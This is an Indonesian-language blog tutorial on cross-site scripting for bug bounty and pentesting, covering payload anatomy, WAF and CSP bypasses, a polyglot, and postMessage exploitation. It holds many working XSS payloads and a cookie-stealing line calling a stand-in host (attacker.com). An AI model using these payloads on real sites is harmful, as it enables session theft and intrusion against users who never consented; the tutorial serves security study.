---
title: "XSS Bukan Sekadar script alert 1 script: Ini yang Sebenarnya Membuat Payload Berjalan"
date: 2026-06-25
author: "RavxyTech"
tags: ["xss", "web-security", "bug-bounty", "waf-bypass", "pentesting", "csp", "dom"]
categories: ["Research", "Web Security"]
description: "Pembahasan mendalam tentang anatomi XSS, dari memahami tag, event, dan atribut, sampai teknik bypass WAF, CSP, DOMPurify, dan postMessage XSS yang masih relevan di 2026."
cover:
  alt: "Ilustrasi XSS payload"
  caption: "Setiap payload XSS yang bekerja selalu tersusun dari tiga komponen inti."
draft: false
---

Banyak orang yang pertama kali belajar XSS bisa paham konsepnya dalam hitungan menit, tapi justru bingung kenapa payload mereka tidak pernah benar-benar berhasil di target nyata. Copy-paste `<script>alert(1)</script>` ke form input, tidak ada yang terjadi. Coba lagi, tetap tidak ada. Akhirnya menyimpulkan bahwa target "tidak vulnerable", padahal belum tentu.

Yang membedakan seseorang yang sekadar menghafal payload dengan yang benar-benar memahami XSS adalah satu hal: mengetahui *mengapa* sebuah payload bisa dieksekusi browser. Begitu itu dipahami, payload yang diblokir bukan lagi hambatan, melainkan undangan untuk berpikir lebih dalam.

---

## Tiga Hal yang Membuat XSS Bekerja

Setiap payload XSS yang berhasil, tidak peduli seberapa obfuscated, seberapa aneh encodingnya, atau seberapa baru tekniknya, selalu bergantung pada tiga hal: **tag** yang akan di-render browser, **event** yang terpicu saat sesuatu terjadi pada tag tersebut, dan **atribut** yang membawa kode JavaScript-nya. Dapatkan ketiganya dengan benar, dan browser akan menjalankan kodenya. Bukan karena keajaiban, tapi memang begitulah cara HTML parser bekerja.

{{< figure src="/images/gambar1.webp" alt="Tiga elemen inti XSS: tag, event, attribute" caption="Tag, event, dan atribut adalah tiga komponen yang selalu ada di setiap payload XSS yang berhasil." >}}

---

## Tag

Tidak semua tag HTML bisa memicu JavaScript, tapi lebih banyak yang bisa dibandingkan perkiraan kebanyakan orang. Yang paling dikenal adalah `<script>`, masukkan kode JS di dalamnya, selesai. Masalahnya, setiap WAF dan sanitizer di dunia sudah memblokirnya secara otomatis. Jadi perlu alternatif.

`<img>` adalah yang paling banyak terbukti di lapangan. Nilai `src=x` sengaja dibuat tidak valid sehingga browser mencoba memuat gambar tersebut, gagal, lalu memicu `onerror`. Di situlah eksekusi terjadi.

```html
<img src=x onerror=alert(1)>
```

`<svg>` adalah favorit untuk bypass karena SVG memiliki parser sendiri yang berperilaku berbeda dari HTML parser, lebih toleran dan lebih fleksibel. Slash antara `svg` dan `onload` adalah sintaks yang valid dan sering luput dari filter WAF.

```html
<svg/onload=alert(1)>
```

`<details>` dengan atribut `open` adalah trik yang masih sering lolos dari deteksi. Atribut `open` memaksa elemen langsung terbuka saat halaman dimuat, yang seketika memicu `ontoggle` tanpa perlu interaksi pengguna sama sekali.

```html
<details open ontoggle=alert(1)>
```

Tag lain yang layak diketahui antara lain `<video>`, `<input>` dengan `autofocus`, dan `<iframe>` dengan pseudo-protokol JavaScript:

```html
<video src=x onerror=alert(1)>
<input autofocus onfocus=alert(1)>
<iframe src="javascript:alert(1)">
```

---

## Event: Pemicu Sebenarnya

Tag saja tidak ada artinya. Event adalah yang mengubah HTML yang ter-render menjadi JavaScript yang berjalan. Event adalah atribut `on*` seperti `onerror`, `onload`, `onfocus`, `ontoggle`, dan sekitar seratusan lainnya. Pembagian paling penting dari sudut pandang penyerang adalah apakah sebuah event berjalan otomatis tanpa interaksi pengguna, atau membutuhkan interaksi seperti klik atau hover.

Event yang auto-trigger adalah yang paling berharga. `onerror` terpicu ketika resource gagal dimuat. `onload` terpicu ketika resource berhasil dimuat. `onfocus` dikombinasikan dengan `autofocus` membuat browser langsung memfokuskan elemen begitu halaman selesai di-render, sehingga XSS berjalan tanpa pengguna melakukan apapun. `ontoggle` dikombinasikan dengan `open` pada `<details>` bekerja dengan logika yang sama.

```html
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
```

Bayangkan stored XSS yang langsung berjalan begitu admin membuka halaman dashboard tanpa mengklik apapun. Itulah dampak nyata dari memilih event yang tepat.

---

## Atribut yang Membawa JavaScript

Selain event handler `on*`, ada atribut tertentu yang bisa menampung JavaScript secara langsung. Yang paling umum adalah `href="javascript:..."` pada tag `<a>`. Pseudo-protokol `javascript:` memberitahu browser untuk mengevaluasi apa yang ada setelahnya sebagai kode JS.

```html
<a href="javascript:alert(document.cookie)">Klik di sini</a>
```

Untuk keperluan bypass, beberapa variasi masih sering lolos dari filter. Pertama dengan case mixing, karena browser tidak peduli huruf besar atau kecil di dalam nilai atribut. Kedua dengan menyisipkan newline yang diencoding di antara protokol dan kode, yang bisa mengelabui filter yang melakukan pencocokan string secara naif.

```html
<a href="jAvAsCrIpT:alert(1)">
<a href="javascript://%0aalert(1)">
```

---

## Menyusun Payload dari Prinsip Dasarnya

Memahami ketiga komponen ini berarti payload bisa disusun dari awal, bukan sekadar mengandalkan cheatsheet. Mulai dari yang paling sederhana: jika tag `<script>` diblokir, ganti tagnya. Jika perlu auto-trigger, tambahkan atribut yang tepat. Jika injeksi terjadi di dalam konteks atribut HTML, keluar dulu dari konteks itu dengan menutup tanda kutip yang ada.

```html
<!-- Dasar -->
<script>alert(1)</script>

<!-- Ganti tag -->
<svg/onload=alert(1)>

<!-- Auto-trigger -->
<input autofocus onfocus=alert(1)>

<!-- Keluar dari konteks atribut -->
"><svg/onload=alert(1)><"

<!-- Payload dengan dampak nyata -->
<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>
```

---

{{< figure src="/images/gambar2.webp" alt="Diagram bypass WAF" caption="WAF mencocokkan pola. Browser memaafkan hampir segalanya. Di situlah celahnya." >}}

## Bypass WAF

WAF seperti Cloudflare, Akamai, Imperva, dan AWS WAF memblokir berdasarkan pola seperti keyword, regex, dan signature. Tugas penyerang adalah membingungkan pattern matcher sambil tetap membuat browser puas. Browser sangat toleran: ia akan mem-parse tag yang malformed, mengabaikan spasi berlebih, menerima mixed case, dan menangani variasi encoding tanpa keluhan. WAF sering kali tidak setoleran itu.

Kalau spasi antar atribut difilter, gunakan `/` sebagai penggantinya:

```html
<details/open/ontoggle=alert(1)>
<img/src=x/onerror=alert(1)>
```

Kalau kata "alert" diblokir, gunakan template literal dengan backtick atau `String.fromCharCode` untuk menghindarinya sama sekali:

```html
<svg/onload=alert`1`>
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
```

Case mixing bekerja karena browser tidak peduli dengan kapitalisasi di tag dan atribut:

```html
<ScRiPt>alert(1)</sCrIpT>
<DeTaIlS/OpEn/OnToGgLe=alert(1)>
```

Komentar JS juga bisa disisipkan di dalam event handler untuk memecah pencocokan pola:

```html
<img src=x onerror=alert/**/(1)>
```

Beberapa ruleset WAF lama juga bisa dikacaukan lewat konteks tanda kutip yang malformed pada atribut:

```html
<details open id="'&quot;'" ontoggle=alert(1)>
```

Browser event yang relatif baru juga sering belum masuk ke signature WAF lama:

```html
<xss oncontentvisibilityautostatechange=alert(1) style="content-visibility:auto" popover>
<input onbeforematch=alert(1) hidden=until-found>
```

---

## Polyglot Payload

Polyglot adalah payload yang dirancang untuk bekerja di berbagai konteks injeksi sekaligus: teks HTML, dalam atribut, di dalam blok `<script>`, `<textarea>`, `<title>`, maupun konteks URL. Saat melakukan fuzzing pada injection point yang belum diketahui konteksnya, polyglot adalah yang paling efisien untuk dilempar lebih dulu karena responsnya akan banyak memberitahu tentang apa yang parser lakukan.

```
jaVasCript:/*--></title></style></textarea></script><svg/onload=alert(1)>
```

Breakdown-nya: `jaVasCript:` menangani konteks URL/href dengan case mixing. `/*-->` menutup komentar JS. `</title></style></textarea></script>` keluar dari keempat konteks tag tersebut. `<svg/onload=alert(1)>` adalah payload aktualnya.

---

## CSP Bypass via JSONP

Kalau sebuah target memiliki `script-src 'self' *.google.com` di Content Security Policy mereka, bukan berarti jalan tertutup sepenuhnya. Google memiliki endpoint JSONP yang me-reflect parameter `callback` langsung ke dalam respons sebagai JavaScript yang bisa dieksekusi. Karena skrip dimuat dari domain `*.google.com`, CSP mengizinkannya.

```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(document.domain)"></script>
```

Untuk mencari JSONP endpoint serupa di domain lain yang masuk whitelist CSP, bisa menggunakan repositori [JSONBee](https://github.com/zigoo0/JSONBee).

---

## DOMPurify

DOMPurify adalah library sanitasi HTML yang cukup solid, tapi bukan berarti tidak pernah ada celah. CVE-2025-26791 berkaitan dengan bug regex pada template literal di mode `SAFE_FOR_TEMPLATES`, yang memungkinkan bypass via kombinasi tag `<math>` dan `<style>`. Saat menemukan aplikasi yang menggunakan DOMPurify, selalu periksa versinya terlebih dahulu. Versi di bawah 2.x patut dicurigai.

---

## postMessage XSS

Banyak aplikasi menggunakan `window.postMessage()` untuk komunikasi antar iframe, widget, dan popup. Ketika sisi penerima langsung memasukkan `event.data` ke dalam `innerHTML` tanpa sanitasi dan tanpa memvalidasi `event.origin`, maka dari halaman penyerang bisa dilakukan hal berikut:

```javascript
// Kode di sisi penerima yang vulnerable
window.addEventListener('message', function(event) {
  document.getElementById('content').innerHTML = event.data;
});
```

```javascript
// Exploit dari halaman penyerang
const frame = document.getElementById('victimFrame');
frame.onload = () => {
  frame.contentWindow.postMessage(
    '<img src=x onerror=alert(document.domain)>',
    '*'
  );
};
```

Cara mencarinya adalah dengan mencari pola `addEventListener.*message` atau `onmessage` dalam file JavaScript lewat DevTools atau Burp. Lalu telusuri ke mana `event.data` berakhir. Kalau ia masuk ke `innerHTML`, `eval`, `location.href`, atau `document.write`, maka itu adalah temuan yang valid.

---

## Identifikasi WAF Sebelum Bypass

Sebelum melempar payload bypass, ada baiknya mengetahui dulu WAF apa yang dihadapi karena WAF yang berbeda punya signature dan kelemahan yang berbeda. Identifikasi pasif bisa dilakukan lewat response header: `CF-RAY` menandakan Cloudflare, `X-CDN: Imperva` menandakan Imperva, dan header `X-Akamai-*` menandakan Akamai. Untuk identifikasi aktif, gunakan `wafw00f`:

```bash
wafw00f https://target.com
```

Setelah tahu WAF-nya, probe apa saja yang diblokir: apakah `<script>`, `<svg>`, atribut `on*`, kata "alert", atau spasi. Setiap temuan yang diblokir mempersempit opsi WAF dan membuka opsi bypass yang relevan.

---

## Lima Payload untuk Pengujian Cepat

Untuk pengujian cepat yang mencakup berbagai kemungkinan, lima payload ini sudah cukup sebagai titik awal:

```html
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<input autofocus onfocus=alert(1)>
jaVasCript:/*--></title></style></textarea></script><svg/onload=alert(1)>
```

Yang terakhir adalah polyglot. Kalau konteks injeksi belum diketahui, mulai dengan itu.

---

## Tools Referensi

Beberapa tools dan referensi yang berguna untuk pengujian XSS:

- [PayloadsAllTheThings XSS Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [JSONBee: JSONP CSP Bypass](https://github.com/zigoo0/JSONBee)
- [wafw00f](https://github.com/EnableSecurity/wafw00f)
- [XSStrike](https://github.com/s0md3v/XSStrike)
- [dalfox](https://github.com/hahwul/dalfox)
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)

---

XSS adalah salah satu vulnerability di mana menghafal payload hanya membawa sejauh tertentu. Yang membuat seseorang benar-benar efektif, baik di bug bounty maupun pentesting, adalah memahami *mengapa* browser mengeksekusi kode ketika melihat kombinasi tertentu dari tag, event, dan atribut. Begitu itu dipahami, tag `<script>` yang diblokir bukan lagi jalan buntu, melainkan pertanyaan: tag mana lagi yang ada, event mana yang otomatis terpicu, dan atribut mana yang filter lupa periksa. Browser memang ingin me-render payload. Tugas kita hanya memahami bahasanya lebih baik dari filter yang berdiri di depannya.

---

> **Disclaimer**
>
> Seluruh teknik dalam artikel ini ditujukan untuk lingkungan lab yang sudah diotorisasi, CTF, dan program bug bounty dalam scope yang jelas. Pengujian pada sistem tanpa izin adalah tindakan ilegal.
>
> [edu.ravxytech.my.id](https://edu.ravxytech.my.id) hadir untuk berbagi pengetahuan seputar teknologi dan cyber security secara bertanggung jawab.